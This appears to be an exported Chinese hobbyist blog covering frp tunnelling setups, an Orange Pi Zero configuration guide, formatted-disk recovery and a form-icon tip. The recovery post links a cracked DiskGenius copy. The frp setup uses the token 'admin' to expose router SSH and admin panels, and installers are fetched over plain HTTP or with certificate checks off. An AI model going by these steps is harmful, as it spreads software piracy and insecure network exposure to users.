vim /usr/lib/systemd/system/frpc.service    #编辑frpc.service文件，敲入以下命令：</code></pre>
<pre><code class="bash">[Unit]
Description=frpc
After=network.target

[Service]
TimeoutStartSec=30
ExecStart=/usr/local/bin/frpc -c /etc/frp/frpc.ini
ExecStop=/bin/kill $MAINPID

[Install]
WantedBy=multi-user.target</code></pre>
<pre><code>systemctl enable frpc    #启动frp并设置开机自启
systemctl start frpc
systemctl status frpc</code></pre><blockquote>
<p>Tips: frpc启动无效时,可以尝试先停止服务： systemctl stop frpc</p>
</blockquote>
<p>到此，香橙派上的Frp客户端配置完成，树莓派啊各种派配置也是一样的。</p>
<h5 id="连接说明"><a href="#连接说明" class="headerlink" title="连接说明"></a>连接说明</h5><pre><code class="bash">SSH: IP地址 -&gt; opi.zhaoo.cc    端口 -&gt; 7122
HTTP: http://opi.zhaoo.cc:7180
HTTPS: https://opi.zhaoo.cc:71433</code></pre>
<h3 id="客户端-小米路由器3-Padavan"><a href="#客户端-小米路由器3-Padavan" class="headerlink" title="客户端 - 小米路由器3(Padavan)"></a>客户端 - 小米路由器3(Padavan)</h3><p><a href="https://note.izhaoo.com/mi-router-3-flash-padavan.html">参考 – 小米路由器3 – 烧录Padavan固件</a></p>
<p><a href="https://note.izhaoo.com/mi-router-3-padavan.html">参考 – 小米路由器3 – Padavan固件</a></p>
<p>我给小米路由器3刷了Padavan，自带Frp功能，所以就直接配置了。</p>
<p><img  src="https://pic.izhaoo.com/20180516130007.jpg"  ><span class="image-caption">小米路由器3-frp</span></p>
<p>启用前先更新一下Frp版本，确保和服务端的版本一致，否则无法建立通信。然后只需在脚本处填写配置即可，我的配置如下：</p>
<pre><code class="bash">#基础配置
[common]
server_addr = zhaoo.cc    #IP地址（直接写IP也可以）
server_port = 7000
privilege_token = admin

#Web配置（Hexo轻博客）
[mirt-web]
type = http
local_ip = 192.168.1.1
local_port = 80
use_gzip = true    #启用gzip压缩
subdomain = mirt    #子域名

#SSH配置
[mirt-ssh]
type = tcp
local_ip = 192.168.1.1
local_port = 22
remote_port = 7222

#Web后台配置
[mirt-admin]
type = tcp
local_ip = 192.168.1.1
local_port = 81    #本地端口我改成了81，防止和web的80端口冲突。
remote_port = 7281

#KODE文件管理系统配置
[mirt-kode]
type = tcp
local_ip = 192.168.1.1
local_port = 82
remote_port = 7282</code></pre>
<p>解释一下：Frp一个子域名下只能穿透一条http或htpps线路，而tcp线路却可以有多条。我们路由器上有许多Web服务需要穿透（轻博客、后台、KODE文件管理系统……），所以这里我们就采取曲线救国的方式，将其他Web线路配置成tcp方式，访问的时候跟上对应的远程端口即可。</p>
<p><img  src="https://pic.izhaoo.com/20180516130535.jpg"  ><span class="image-caption">保存配置</span></p>
<p>写入配置脚本后，点击下方的<code>应用本页面设置</code>，再<code>重启一下</code>Frp服务，通信即建立。</p>
<h5 id="连接说明-1"><a href="#连接说明-1" class="headerlink" title="连接说明"></a>连接说明</h5><pre><code class="bash">SSH: IP地址 -&gt; mirt.zhaoo.cc    端口 -&gt; 7222
博客: http://mirt.zhaoo.cc:7080
路由器后台: http://mirt.zhaoo.cc:7081
KODE文件管理系统: http://mirt.zhaoo.cc:7082</code></pre>
<h3 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h3><p>按照之前的配置，如果我要访问小米路由器3上搭建的Hexo博客，那么需要访问的地址是<code>mirt.zhaoo.cc:7080</code>，需要跟上个端口号。哪有人访问Web页面还得加个端口号的，况且这样也不利于SEO。所以我们用到Nginx反向代理这项技术，将<code>7080</code>🇨🇳端口反代到<code>80</code>端口上。</p>
<p>我服务器安装了<code>宝塔面板</code>，可以很直观的设置反向代理，这里仅做个演示。没安装的朋友用命令行配置也是没问题的，具体问度娘。<br>在宝塔面板下新建网站，绑定域名，然后设置。</p>
<p><img  src="https://pic.izhaoo.com/20180516164500.jpg"  ><span class="image-caption">宝塔面板-新建网站</span></p>
<p>然后在反向代理子目录下设置<code>目标URL</code>为<code>域名:frp端口号</code>，我这就是<code>http://mirt.zhaoo.cc:7080</code>。设置好后开启反向代理。</p>
<p><img  src="https://pic.izhaoo.com/20180516164634.jpg"  ><span class="image-caption">设置反向代理</span></p>
<p>之后访问<code>http://mirt.zhaoo.cc</code>就可以直接访问到我的博客了。</p>
<blockquote>
<p>Tips: 还可以在宝塔面板下配置https哦。这样博客就可以直接搭在小米路由器上了。emmm…我还是喜欢服务器…</p>
</blockquote>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.shafa.com/articles/zTJH8D1xf7ZVhAmT.html">IT男的VPS系列教程 篇一：内网穿透（Frp）-拯救没有公网IP的你</a></p>
<p><a href="https://blog.csdn.net/sinat_30800357/article/details/78532956?locationNum=1&fps=1">借助 frp 随时随地访问自己的树莓派</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>路由器</tag>
        <tag>树莓派</tag>
        <tag>香橙派</tag>
      </tags>
  </entry>
  <entry>
    <title>香橙派 - 安装配置汇总</title>
    <url>/2018/05/11/orangepi-config-collect/</url>
    <content><![CDATA[<p>香橙派 Zero 安装和配置汇总。这几天朋友借了我的树莓派玩，顺便翻出了香橙派，这破板子买来就没玩过，丢着积灰。趁这几天有空折腾一番。<br>部分内容我已经在其他文章写过了，这里就不再赘述，看“参考”文章吧。</p>
<span id="more"></span>

<h1 id="Armbian系统安装"><a href="#Armbian系统安装" class="headerlink" title="Armbian系统安装"></a>Armbian系统安装</h1><p><a href="http://www.orangepi.cn/downloadresourcescn/">官方镜像网站</a></p>
<p><a href="https://www.armbian.com/orange-pi-zero/">Armbian官网</a></p>
<p><a href="https://note.izhaoo.com/raspberrypi-install-system-without-display.html">参考 – 树莓派 – 无屏幕安装系统</a></p>
<p>我选择的系统是Armbian，非官方镜像，当然你也可以选择官网的其他系统。</p>
<pre><code>Tips: 这板子坑的一批，官方放出的那些镜像都有Bug，要么WiFi连不上，要么GPIO用不了……</code></pre><p>官网没有Armbian的下载链接，要去<a href="https://www.armbian.com/orange-pi-zero/">Armbian官网</a>下载。可以看到有两个版本：Xenial（基于Ubuntu内核，就当他是Ubuntu吧）和 Stretch（Debian内核，就当它是Debian吧），我下载的是Armbian-Xenial-4.14y。</p>
<p>下载镜像之后就可以安装了。</p>
<p><img  src="https://pic.izhaoo.com/20180511152558.jpg"  ><span class="image-caption">Armbian安装</span></p>
<h1 id="SSH连接"><a href="#SSH连接" class="headerlink" title="SSH连接"></a>SSH连接</h1><p><a href="https://note.izhaoo.com/raspberrypi-config-collect.html#无屏幕安装系统">参考 – 树莓派 – 无屏幕安装系统</a></p>
<p>先用网线连接香橙派和路由器，然后登陆路由器查看香橙派的IP地址，在SSH软件（Xshell或Putty）上输入IP、用户名、密码连接即可。</p>
<pre><code>初始用户名：root
初始密码：1234</code></pre><p><img  src="https://pic.izhaoo.com/20180511153305.jpg"  ><span class="image-caption">查看IP</span></p>
<h1 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h1><p>第一次连接SSH后会让你设置密码，设置一个。以后SSH和Root用户密码都是这个。</p>
<p><img  src="https://pic.izhaoo.com/20180511153513.jpg"  ><span class="image-caption">更改密码</span></p>
<p>然后会让你创建一个普通用户，输入用户名、密码、个人信息。（一般用不到，用Root用户就好了。）</p>
<h1 id="SD卡大小调整"><a href="#SD卡大小调整" class="headerlink" title="SD卡大小调整"></a>SD卡大小调整</h1><p>需要调整SD卡大小，分配所有空间，不然之后会不够用。</p>
<pre><code>fs_resize    #调整SD卡大小
shutdown -r now    #重启一下</code></pre><h1 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h1><p>重启后更新下系统，很漫长，耐心等待。</p>
<pre><code>apt-get update
apt-get upgrade</code></pre><h1 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h1><pre><code>armbian-config    #打开系统配置工具</code></pre><pre><code>Tips: Tab、方向键键选择，Enter键确定</code></pre><p>这里可以进行一些简单配置。这里汉化先不做了，下面会讲到。</p>
<ol>
<li>System</li>
</ol>
<p>没什么好配置的，下一个。</p>
<ol start="2">
<li>Network</li>
</ol>
<p>连接WiFi。</p>
<p><img  src="https://pic.izhaoo.com/20180511161022.jpg"  ><span class="image-caption">连接WiFi</span></p>
<ol start="3">
<li>Personal</li>
</ol>
<p>设置时区、设备名、登录信息等。</p>
<p><img  src="https://pic.izhaoo.com/20180511161331.jpg"  ><span class="image-caption">个人设置</span></p>
<ol start="4">
<li>Software</li>
</ol>
<p>这里可以安装一些软件，少得可怜，不如用命令装呢。</p>
<h1 id="开启BBR"><a href="#开启BBR" class="headerlink" title="开启BBR"></a>开启BBR</h1><p><a href="https://note.izhaoo.com/ubuntu-install-bbr-by-update-kernel.html">参考 – Ubuntu14.04开启BBR加速</a></p>
<p>BBR简单说就是用来加快网速的，因为安装的系统内核是4.14 &gt; 4.9，所以自带BBR，我们只需要开启即可。</p>
<h1 id="VNC连接"><a href="#VNC连接" class="headerlink" title="VNC连接"></a>VNC连接</h1><p><a href="https://note.izhaoo.com/raspberrypi-config-collect.html#VNC">参考 – 树莓派 – vnc远程登陆配置</a></p>
<h2 id="安装VNC"><a href="#安装VNC" class="headerlink" title="安装VNC"></a>安装VNC</h2><p>虽说这小弱鸡没必要安装图形化界面，但还是提一下吧。</p>
<pre><code>sudo apt-get install tightvncserver    #安装VNC服务端
vncpasswd    #设置VNC连接密码</code></pre><p>输入两次密码，询问是否需要浏览用户，按N回车，不需要。</p>
<pre><code>sudo nano /etc/init.d/tightvncserver    #新建&quot;tightvncserver&quot;文件，设置开机自启动</code></pre><p>写入以下内容，保存。</p>
<pre><code>#!/bin/sh
### BEGIN INIT INFO
# Provides:          tightvncserver
# Required-Start:    $local_fs
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start/stop tightvncserver
### END INIT INFO
# More details see:
# http://www.penguintutor.com/linux/tightvnc
### Customize this entry
# Set the USER variable to the name of the user to start tightvncserver under
# 用户名
export USER=&#39;root&#39;
### End customization required
eval cd ~$USER
case &quot;$1&quot; in
  start)
    # 启动命令行。此处自定义分辨率（和你电脑分辨率设置一样吧）、控制台号码或其它参数。
    su $USER -c &#39;/usr/bin/tightvncserver -depth 16 -geometry 1920x1080 :1&#39;
    echo &quot;Starting TightVNC server for $USER &quot;
    ;;
  stop)
    # 终止命令行。此处控制台号码与启动一致。
    su $USER -c &#39;/usr/bin/tightvncserver -kill :1&#39;
    echo &quot;Tightvncserver stopped&quot;
    ;;
  *)
    echo &quot;Usage: /etc/init.d/tightvncserver &#123;start|stop&#125;&quot;
    exit 1
    ;;
esac
exit 0</code></pre><p>再给<code>tightvncserver</code>文件加执行权限，并更新开机启动列表。</p>
<pre><code>sudo chmod 755 /etc/init.d/tightvncserver
sudo update-rc.d tightvncserver defaults</code></pre><p>使用命令，后面控制台号码可以自行设置，连接的时候跟上就行。</p>
<pre><code>vncserver :1    #开启VNC
vncserver kill :1    #关闭VNC</code></pre><p>开启vnc后提示如下信息，缺少字体文件。</p>
<p><img  src="https://pic.izhaoo.com/20180511162604.jpg"  ><span class="image-caption">缺少字体</span></p>
<h2 id="安装字体"><a href="#安装字体" class="headerlink" title="安装字体"></a>安装字体</h2><p>！！！敲黑板，重点来了。</p>
<pre><code>apt-get install  xfonts-base    #安装基本字体</code></pre><p>安装字体后就可以正常开启VNC了。</p>
<p>连接后显示如下灰屏，因为我们没有安装桌面环境，下面我们来安装。</p>
<h1 id="Xfce4桌面安装"><a href="#Xfce4桌面安装" class="headerlink" title="Xfce4桌面安装"></a>Xfce4桌面安装</h1><p><img  src="https://pic.izhaoo.com/20180511164417.jpg"  ><span class="image-caption">Xfce桌面</span></p>
<p>Xfce是一款轻量级的Linux桌面环境，用在小弱鸡上丝毫不卡，网上很多人安利这款，但我个人觉得太丑了。</p>
<pre><code>apt-get install xfce4    #安装Xfce桌面</code></pre><p>开启一下VNC，会生成一个”xstartup”文件。</p>
<pre><code>vncserver :1</code></pre><pre><code>cd ~/.vnc    #移动到VNC目录
cp xstartup xstartup-bak    #备份&quot;xstartup&quot;文件
nano xstartup    #打开&quot;xstartup&quot;文件</code></pre><p>编辑<code>~/.vnc/xstartup</code>文件，删除或注释已有代码，写入以下代码。</p>
<pre><code>xsetroot -solid grey
vncconfig -solid gery
x-terminal-emulator -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP Desktop&quot; &amp;
x-sesion-manager &amp; xfdesktop &amp; xfce4-panel &amp;
xfce4-menu-plugin &amp;
xfsettingsd &amp;
xfconfd &amp;
xfwm4 &amp;</code></pre><p><img  src="https://pic.izhaoo.com/20180511164107.jpg"  ><span class="image-caption">xstartup文件</span></p>
<p>保存并重启，连接VNC，可以看到Xfce桌面了。</p>
<h1 id="KDE-Plasma桌面安装"><a href="#KDE-Plasma桌面安装" class="headerlink" title="KDE-Plasma桌面安装"></a>KDE-Plasma桌面安装</h1><p><img  src="https://pic.izhaoo.com/20180511174636.jpg"  ><span class="image-caption">KDE-Plasma桌面</span></p>
<p>KDE-Plasma是一款很漂亮的桌面，但是强烈建议你不要装。因为……巨卡无比，中看不中用。好了，终于知道社区大佬们为什么都喜欢Xfce了。</p>
<h2 id="安装KDE-Plasma"><a href="#安装KDE-Plasma" class="headerlink" title="安装KDE-Plasma"></a>安装KDE-Plasma</h2><pre><code>sudo add-apt-repository ppa:kubuntu-ppa/backports    #添加源
sudo apt-get update    #更新源
sudo apt-get install plasma-desktop    #安装Plasma
sudo apt-get install lightdm-kde-greeter</code></pre><p>编辑<code>/etc/lightdm/lightdm.conf</code>内容。</p>
<pre><code>autologin-guest=false
#autologin-user=pi
#autologin-user-timeout=0
greeter-session=lightdm-kde-greeter
user-session=kde-plasma-kf5</code></pre><p>编辑<code>~/.vnc/xstartup</code>文件，删除或注释已有代码，写入以下代码。</p>
<pre><code>xsetroot -solid grey
vncconfig -solid gery
x-terminal-emulator -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP Desktop&quot; &amp;
statkde &amp;</code></pre><p><img  src="https://pic.izhaoo.com/20180511174720.jpg"  ><span class="image-caption">xstartup文件</span></p>
<p>保存并重启，连接VNC，可以看到KDE-Plasma桌面了。怎么样，体会到了吧，Xfce好。</p>
<h2 id="卸载KDE-Plasma"><a href="#卸载KDE-Plasma" class="headerlink" title="卸载KDE-Plasma"></a>卸载KDE-Plasma</h2><pre><code>sudo apt-get remove kubuntu-desktop 
sudo apt-get autoremove
sudo apt-get --purge remove kdelibs4c2a
sudo apt-get --purge remove kdelibs4
sudo apt-get remove kdm
sudo apt-get remove plymouth-theme-kubuntu-logo
sudo shutdown -r now</code></pre><h1 id="宝塔面板安装"><a href="#宝塔面板安装" class="headerlink" title="宝塔面板安装"></a>宝塔面板安装</h1><p><a href="https://note.izhaoo.com/raspberrypi-config-collect.html#宝塔面板">参考 – 树莓派 – 部署宝塔面板</a></p>
<p>搭建LNMP环境，运行Web服务。</p>
<p>安装面板过程中会用到一个Python库，系统默认没有安装，我们先来安装它。</p>
<pre><code>wget https://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg    #下载库
sh setuptools-0.6c11-py2.7.egg    #安装库</code></pre><p>接下来就可以安装宝塔面板了，但是呢，现在宝塔面板已经“假装”不支持32位系统了，我们直接安装的话会提示错误。</p>
<p><img  src="https://pic.izhaoo.com/20180511182351.jpg"  ><span class="image-caption">不支持32位系统</span></p>
<p>其实我们只要删除脚本的验证行就可以了，32位系统还是支持的。</p>
<pre><code>wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh    #下载脚本
nano install.sh    #编辑脚本</code></pre><p>删除或注释如下几行。</p>
<pre><code>#if [ &quot;$is64bit&quot; = &#39;32&#39; ];then
#        echo &#39;=================================================&#39;;
#        echo -e &quot;\033[31m BT-Panel Incompatible 32 bit OS. \033[0m&quot;;
#        exit;
#fi</code></pre><p><img  src="https://pic.izhaoo.com/20180511182652.jpg"  ><span class="image-caption">删除注释</span></p>
<p>然后就可以安装了。</p>
<pre><code>sh install.sh    #安装面板</code></pre><p>安装好后在五分钟内访问网址，用默认密码登录，然后修改密码。</p>
<h1 id="一键LNMP"><a href="#一键LNMP" class="headerlink" title="一键LNMP"></a>一键LNMP</h1><p>宝塔面板毕竟太”重”了，还是装一个”轻”LNMP吧。手动配置LNMP呢又太麻烦，所以我们用一个脚本，一键LNMP。</p>
<pre><code>wget -c http://soft.vpser.net/lnmp/lnmp1.4.tar.gz &amp;&amp; tar zxf lnmp1.4.tar.gz &amp;&amp; cd lnmp1.4 &amp;&amp; ./install.sh lnmp</code></pre><p>建议都选择默认配置，回车敲到底吧，偶尔会要你设置密码。</p>
<h1 id="Netdata安装"><a href="#Netdata安装" class="headerlink" title="Netdata安装"></a>Netdata安装</h1><p>Netdata是一款性能监测软件。</p>
<p><img  src="https://pic.izhaoo.com/20180512110249.jpg"  ><span class="image-caption">Netdata</span></p>
<pre><code>wget --no-check-certificate https://github.com/firehol/netdata/releases/download/v1.10.0/netdata-1.10.0.tar.gz    #下载
tar -xf netdata-1.10.0.tar.gz    #解压
cd netdata-1.10.0    #进入目录
./netdata-installer.sh    #安装</code></pre><p>食用方法：</p>
<pre><code>/usr/sbin/netdata    #启动Netdata
killall netdata    #关闭Netdata
vim /etc/netdata/netdata.conf    #配置Netdata</code></pre><p>安装完成后浏览器访问<code>http://香橙派IP:19999</code>即可。</p>
<h1 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h1><p><a href="https://note.izhaoo.com/frp-deploy.html">参考 – Frp内网穿透部署</a></p>
<p>我们香橙派一般部署在内网，外网是无法访问的。通过部署Frp可以达到外网访问的目的。</p>
<p>简单介绍一下原理，在服务端（服务器）和客户端（香橙派）同时部署Frp，客户端反向连接服务端，因为服务端一般是静态IP且绑了域名，然后我们就可以很方便地通过访问服务端来连接客户端了。。我自己都快绕晕了，简单来说就是服务器充当桥梁来连接香橙派。</p>
<h1 id="Openwrt-打造超米你路由器"><a href="#Openwrt-打造超米你路由器" class="headerlink" title="Openwrt - 打造超米你路由器"></a>Openwrt - 打造超米你路由器</h1><p>给OrangePi-Zero刷入openwrt，打造超米你路由器。</p>
<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p><a href="https://pan.baidu.com/s/1qYsPm36">openwrt4orangepi-百度网盘</a></p>
<p><a href="https://sourceforge.net/projects/win32diskimager/files/Archive/win32diskimager-v0.9-binary.zip/download">镜像烧录工具 - Win32DiskImager</a></p>
<p>下载后解压，得到一个img镜像。</p>
<h2 id="固件刷入"><a href="#固件刷入" class="headerlink" title="固件刷入"></a>固件刷入</h2><p>准备一张TF卡，插入电脑，最好先格式化一下，确保只有一个空白分区。</p>
<p><img  src="https://pic.izhaoo.com/20170929111810.jpg"  ><span class="image-caption">格式化</span></p>
<p>打开Win32DiskImager，选择TF卡盘符，选择镜像目录，然后点击刷入。</p>
<p><img  src="https://pic.izhaoo.com/20170929201808.jpg"  ><span class="image-caption">刷入</span></p>
<p>等一会儿刷入完成，将TF卡插回香橙派，上电开机。</p>
<h2 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h2><p>等一会儿，可以看到，我们能搜到一个叫做“OrangePiZero”的wifi，连接。</p>
<pre><code>默认wifi密码：internet</code></pre><p><img  src="https://pic.izhaoo.com/20170929202814.jpg"  ><span class="image-caption">wifi</span></p>
<p>然后浏览器输入地址“192.168.1.1”可以进入openwrt后台。</p>
<pre><code>默认后台帐号：root

默认后台密码：root</code></pre><p>然后进行各种设置就可以用了。</p>
<p><img  src="https://pic.izhaoo.com/20170929203458.jpg"  ><span class="image-caption">登陆界面</span></p>
<p><img  src="https://pic.izhaoo.com/20170929204546.jpg"  ><span class="image-caption">进入后台</span></p>
<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>用“Xshell”或“putty”等工具连接香橙派。</p>
<pre><code>默认地址：192.168.1.1

默认SSH密码：root</code></pre><h2 id="中文语言包"><a href="#中文语言包" class="headerlink" title="中文语言包"></a>中文语言包</h2><p>进入SSH后，输入以下命令安装：</p>
<pre><code>opkg update

opkg install luci

opkg install luci-i18n-base-zh-cn</code></pre><p>然后进后台设置即可。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>香橙派的openwrt毕竟是移植过来的，兼容性不太好，动不动死机，建议别用于生产环境。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="http://www.jianshu.com/p/c5736406298a">简书 – 关爱单身狗成长协会 – OrangePi Zero 运行OpenWRT做迷你WIFI路由器</a></p>
<h1 id="入坑山寨"><a href="#入坑山寨" class="headerlink" title="入坑山寨"></a>入坑山寨</h1><p>香橙派Zero是一款开源的单板电脑，新一代的arm开发板,它可以运行Android4.4、Ubuntu、Debian等操作系统。香橙派Zero使用全志H2系统级芯片，同时拥有512MB内存。</p>
<h2 id="OrangePi-Zero"><a href="#OrangePi-Zero" class="headerlink" title="OrangePi-Zero"></a>OrangePi-Zero</h2><p>树莓派我们不陌生，是一款有趣的玩具。今天我又买了个香橙派，呵呵，听名字就知道了，山寨板，产自中国台湾。不过凭良心讲，这东西还真不错，物美价廉。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>|:————-:|:————-:|<br>|CPU| 全志H2 ARM的Cortex-A7四核|<br>|GPU|Mali400MP2 GPU @600MHzSupports OpenGL ES 2.0|<br>|RAM|256MB/512MB DDR3(与GPU共享) （256MB为标准版本）|<br>|ROM|TF卡（最大64GB）/或者Flash(2MB缺省空贴)|<br>|NetWork|10/100M 以太网 RJ45 （POE供电缺省未打开）|<br>|Wifi|XR819, IEEE 802.11 b/g/n|<br>|音频输入|MIC|<br>|视频输出|  支持13pin外接板输出|<br>|电源|USB OTG(集成POE供电)|<br>|USB 2.0 端口|1个 USB 2.0 HOST, 1个 USB 2.0 OTG|<br>|Low-level peripherals| 26pin接头，兼容Raspberry Pi B+13pin接头，带2个USB， IR pin，AUDIO(MIC, AV)|<br>|LED灯|电源指示灯和状态指示灯|<br>|支持的操作系统|Android, Ubuntu, Debian, Armbian等操作系统|<br>|扩展板|2xUSB2.0，模拟音视频输出，MIC麦克风，红外接收|</p>
<p>还可以哦，和树莓派2实力相当。</p>
<h2 id="外观"><a href="#外观" class="headerlink" title="外观"></a>外观</h2><p>|:————-:|:————-:|<br>|尺寸|48mm × 46mm|<br>|重量|26g|</p>
<p><img  src="https://pic.izhaoo.com/20170929212324.jpg"  ><span class="image-caption">板子</span></p>
<p><img  src="https://pic.izhaoo.com/20170929212337.jpg"  ><span class="image-caption">带盒子</span></p>
<p>很迷你有木有，好吧你看不出，拿尺子比划比划。造吗？把它改成路由器，比小米路由器mini还mini。</p>
<p>但是不得不吐槽下香橙派的塑料外壳，反人类设计啊！你让我把它的尾巴（天线）往哪搁？！最后还得自己凿个洞，总不能剪了吧。在工具匮乏的大学寝室，凿洞还是个技术活。</p>
<h2 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h2><p>这是大家最关心的问题了。</p>
<p>duang~一口价，59软妹币。</p>
<p>什么？！你没听错！不要999，也不要99，只要59，真的只要59。</p>
<p>→_→ 我真的没收广告费</p>
<h2 id="派家族"><a href="#派家族" class="headerlink" title="派家族"></a>派家族</h2><p>树莓派、香橙派、香蕉派、杨梅派 （真有想象力，把水果儿们派个遍吧）</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>树莓派</tag>
        <tag>raspberrypi</tag>
      </tags>
  </entry>
  <entry>
    <title>硬盘误格式化恢复</title>
    <url>/2018/04/08/hard-disk-formatting-recovery/</url>
    <content><![CDATA[<p>硬盘误格式化恢复。这篇文章是去年暑假写在旧博客的，后来又丢到了知乎。快一年了，发现帮助了一些人，那么再把它搬到这边吧。</p>
<span id="more"></span>

<p><a href="https://zhuanlan.zhihu.com/p/28302462">知乎文章</a></p>
<p><a href="https://blog.izhaoo.com/usb-hhd-data-recovery.html">兆兆博客文章</a></p>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><ol>
<li><p>说明一下，这个软件是64位的，所以要在64位电脑上操作。如果是32位电脑的话可以找台其他64位的电脑试试，比如网吧。</p>
</li>
<li><p>如果是物理硬盘勿格式化的话可以找个U盘写个WinPE进去，用PE引导恢复，再提取到U盘或其他移动介质上。</p>
</li>
<li><p>如果是U盘误格式化的话，一样恢复也是可以的。</p>
</li>
</ol>
<h3 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h3><p>（十万火急可跳过）</p>
<p>本人今年高中刚毕业，嗯，准大学党。在家闲着也是闲着，想趁着暑假上吗帮人修电脑，赚点早饭钱，想法是美好的~六月十四日，迎来了第一单生意。顾客用是N年前的老爷机，卡的一逼，我想装个系统就好了嘛，so easy。然而……天有不测风云。电脑实在太老，我带去的5个引导U盘，没一个能引导入Win PE的，迷之尴尬。启动光盘这种N年前的装机工具也没带去。so……只能现场下老PE，安装。 </p>
<p>！！！ </p>
<p>But，安装PE的时候，居然很诡异的装到了移动硬盘上！移动硬盘里存着本人半辈子的data，心血啊！顿时欲哭无泪……开始怀疑人生了。痛定思痛，痛何如哉。还是要想办法把逝去的data救回来。于是我上网找各种数据恢复软件，各种比较之后，发现还是DiskGenius,破解版这款大众软件效果好。然而DiskGenius防破解机制做得很好，网上根本找不到破解版，大文件就恢复不了。购买专业版又要300大洋，赔了夫人又折兵。绝望了……后来，经过三天的苦苦追寻，各种尝试，终于找到了真正的DiskGenius破解版。唉……所有逝去的data终于找回来了，还附带找回了当年删掉的一些data，缅怀一下过去吧。（^_^）</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>为什么硬盘（U盘/SD卡）误格式化后还能恢复数据呢？</p>
<p>我们首先要了解删除文件/格式化的机制。在一般情况下，我们删除文件/格式化其实只是在扇区标记删除，也就是说文件实际还是在的，只是用了影分身之术，我们看不到了而已。然后在我们写入新文件时，新文件再把标记删除的文件覆盖。这也是为了能高效读/写文件。</p>
<p>所以说，误删/误格式化后理论上里面的文件是能就救的。！！！但是千万不要写入新文件，一旦旧文件被覆盖，就算是上帝也救不回来的。</p>
<h3 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h3><p>恢复过程很简单。无非就是需要一个可用的破解版DiskGenius。（当然土豪请绕道官网买正版）</p>
<p>打开DiskGenius，选中误格式化的硬盘（U盘/SD卡）。</p>
<p>！！！注意了，不要选择单个分区，一定要选中整个硬盘。我第一次就是因为没选择了单个分区，恢复了一天一夜还没结果。</p>
<p><img  src="https://pic.izhaoo.com/v2-94f872d4c4c41538bdf76afde43d0ba9_hd.jpg"  ><span class="image-caption">1</span></p>
<p>然后点击恢复文件即可，勾选完整恢复，恢复额外格式。最后就是静等，该干嘛干嘛去，不要桑心，不要害怕。建议来壶上好的大佛龙井。大概一两小时后，硬盘扫描完毕，不出意外的话，误删/格的文件会被找到，点击复制到其他目录即可。就是这么简单……</p>
<p><img  src="https://pic.izhaoo.com/v2-bee1d74918dfda4cea4583c03cacdf73_hd.jpg"  ><span class="image-caption">2</span></p>
<p><img  src="https://pic.izhaoo.com/v2-2743ba5cb7760aecbcabe789d0c558e5_hd.jpg"  ><span class="image-caption">3</span></p>
<p>关键还是要有这么个可用的数据恢复软件。↓↓↓</p>
<p><a href="https://pan.baidu.com/s/1qYyjnxM">DiskGenius破解版-百度云</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>表单Placeholder内使用IconFont图标文字</title>
    <url>/2018/03/25/placeholder-use-font-awesome/</url>
    <content><![CDATA[<p>表单Placeholder内使用IconFont图标文字。</p>
<span id="more"></span>

<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>最近在写一个后台登陆页面，构思在帐号密码输入框的占位符内添加一个<code>Font-awesome</code>图标文字。（如图）</p>
<p><img  src="https://pic.izhaoo.com/20180325203555.jpg"  ><span class="image-caption">表单</span></p>
<p>可是呢，占位符文本是定义在<code>placeholder=&quot;&quot;</code>这个属性里的。而<code>Font-awesome</code>呢又是用<code>&lt;li&gt;</code>标签加<code>class=&quot;fa&quot;</code>类来实现的。所以这个带<code>class</code>的<code>&lt;li&gt;</code>标签就没法插到<code>placeholder</code>里去了。 </p>
<pre><code class="html">&lt;input type=&quot;text&quot; class=&quot;text&quot; placeholder=&quot;用户名&quot;&gt;

&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;</code></pre>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>查了资料后找到了阿里的<code>IconFont</code>，也是一个图标字体框架。和<code>Font-awesome</code>不同的是，<code>IconFont</code>提供了多种引用方式。这里我们就通过<code>unicode</code>引用方式将图标文字插入到表单占位符中。</p>
<ol>
<li>首先我们选择几个心仪的图标加入到自己的项目中。值得一提的时图标库中也有<code>Font-awesome</code>图标哦。</li>
<li>生成工程，下载文件。</li>
<li>将下载的文件放到网站目录下。</li>
<li>在css中引入<code>font-face</code>和<code>iconfont的样式</code>。</li>
<li>然后在<code>placeholder</code>的值中插入对应图标的<code>unicode</code>即可。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20180325205512.jpg"  ><span class="image-caption">iconfont</span></p>
